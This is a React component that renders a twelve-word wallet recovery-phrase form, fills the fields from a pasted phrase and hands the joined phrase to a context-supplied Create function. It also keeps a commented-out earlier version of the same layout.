import { useState } from "react";
import { ArrowLeft } from "lucide-react";
import ContextAccesser from "../context/ContextAccesser"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Layout } from "./Shared/Layout"
const Wallet = () => {
  const {  setCurrentPage ,Create,setPhrases} = ContextAccesser();

  const [phrase, setPhrase] = useState(new Array(12).fill(""));
  const [disable, setDisbale] = useState(false);
  const handlePhraseChange = (index, value) => {
    if (value.includes(" ")) {
      const words = value.split(" ").slice(0, 12);
      const updatedPhrase = [...phrase];
      words.forEach((word, i) => {
        if (index + i < 12) updatedPhrase[index + i] = word;
      });
      setPhrase(updatedPhrase);
    } else {
      const updatedPhrase = [...phrase];
      updatedPhrase[index] = value;
      setPhrase(updatedPhrase);
    }
  };

  const handleSubmit = async (e) => {
    setDisbale(true);
    e.preventDefault();
    setPhrases(phrase.join(" "));
    const success = await Create(); // Wait for the Create function
    if (success) {
      setCurrentPage("details"); // Navigate only on success
    }
    setDisbale(false);
  };

  return (
      <Layout>
      <div className="mx-auto max-w-2xl">
        <Button variant="ghost" className="mb-8" onClick={()=>{setCurrentPage("main")}}>
         
            <ArrowLeft className="mr-2 h-4 w-4" />
            Back
        
        </Button>

        <Card>
          <CardHeader>
            <CardTitle className="text-center">Enter Recovery Phrase</CardTitle>
          </CardHeader>
          <CardContent>
            <form  onSubmit={handleSubmit}>
            <div className="grid grid-cols-2 gap-4 md:grid-cols-4">
              {phrase.map((word,index) => (
                <div key={index} className="space-y-2">
                  <label className="text-sm font-medium">{index+1}.</label>
                  <Input required  type="text"
                  value={word}
                  onChange={(e) => handlePhraseChange(index, e.target.value)}/>
                </div>
              ))}
            </div>
            <Button disabled={disable} type="submit" className="mt-8 w-full">Recover Wallet</Button>
            </form>
          </CardContent>

        </Card>
      </div>
    </Layout>
    // <div className="min-h-screen flex flex-col items-center justify-center bg-black text-white p-4">
    //   <div className="w-full max-w-md space-y-8">
    //     <button
    //       className="flex items-center text-white hover:text-gray-300"
    //       onClick={() => setCurrentPage("main")} // Replace with actual navigation
    //     >
    //       <ArrowLeft className="mr-2 h-4 w-4" />
    //       Back
    //     </button>

    //     <h1 className="text-3xl font-bold text-center">
    //       Enter Recovery Phrase
    //     </h1>

    //     <form onSubmit={handleSubmit} className="space-y-6">
    //       <div className="flex flex-wrap gap-2 justify-between">
    //         {phrase.map((word, index) => (
    //           <div key={index} className="flex items-center">
    //             <p className="font-mono">{index + 1}.</p>
    //             <input
    //               required
    //               type="text"
    //               // maxLength={15}
    //               value={word}
    //               onChange={(e) => handlePhraseChange(index, e.target.value)}
    //               className="w-20 h-8 px-2 text-white font-semibold from-neutral-400 text-sm bg-zinc-800 text-center border border-black rounded focus:outline-none focus:ring-2 focus:ring-zinc-700"
    //             />
    //           </div>
    //         ))}
    //       </div>

    //       <button
    //         disabled={disable}
    //         type="submit"
    //         className="w-full h-10 text-base font-semibold bg-white text-black hover:bg-gray-200 rounded disabled:cursor-not-allowed disabled:bg-gray-300 disabled:text-gray-500"
    //       >
    //         Recover Wallet
    //       </button>
    //     </form>
    //   </div>
    // </div>
  );
};

export default Wallet;
